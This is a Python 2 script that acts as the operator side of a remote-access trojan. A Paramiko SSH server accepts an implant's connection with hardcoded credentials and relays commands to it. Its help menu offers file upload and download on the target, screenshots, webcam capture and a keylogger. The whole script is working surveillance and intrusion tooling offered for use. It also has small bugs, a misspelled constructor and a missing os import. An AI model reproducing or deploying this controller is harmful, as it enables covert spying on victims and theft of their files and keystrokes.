import socket
import paramiko
import threading
import sys
# using the key from the Paramiko demo files
host_key = paramiko.RSAKey(filename='test_rsa.key')
class Server (paramiko.ServerInterface):
   def _init_(self):
      self.event = threading.Event()
   def check_channel_request(self, kind, chanid):
      if kind == 'session':
          return paramiko.OPEN_SUCCEEDED
      return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
   def check_auth_password(self, username, password):
       if (username == 'payload_username') and (password == 'payload_password'):
           return paramiko.AUTH_SUCCESSFUL
       return paramiko.AUTH_FAILED
server = "localhost" 
ssh_port = 5555
try:
   sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
   sock.bind((server, ssh_port))
   sock.listen(100)
   print '[+] Listening for connection ...'
   client, addr = sock.accept()
except Exception, e:
   print '[-] Listen failed: ' + str(e)
   sys.exit(1)
print '[+] Got a connection!'
try:
   Session = paramiko.Transport(client)
   Session.add_server_key(host_key)
   server = Server()
   try:
      Session.start_server(server=server)
   except paramiko.SSHException, x:
      print '[-] SSH negotiation failed.'
   chan = Session.accept(20)
   print '[+] Authenticated!'
   print chan.recv(1024)

   while True:
     try:
        command= raw_input("Enter command: ").strip('\n')

        if command == 'exit':

         chan.send('exit')
         print 'Exiting...'
         Session.close()
         raise Exception ('Exit')

        elif command == 'help':
          print('[*] Commands Avaiable:\n')
          print('[+] Upload file to target: upload file')
          print('[+] Download file from target: download /path/to/file')
          print('[+] Take a screenshot: screenshot')
          print('[+] Take webcam shot: webcam')
          print('[+] Keylogger: keylogger')
          print('[+] Exit: exit')
        else:
         chan.send(command)
         print chan.recv(4096) + '\n'

     except KeyboardInterrupt:
        os.system('killall -2 ssh php')
        Session.close()
except Exception, e:
   print '[-] Caught exception: ' + str(e)
   try:
      os.system('killall -2 ssh php')
      Session.close()
   except:
      pass
   sys.exit(1)
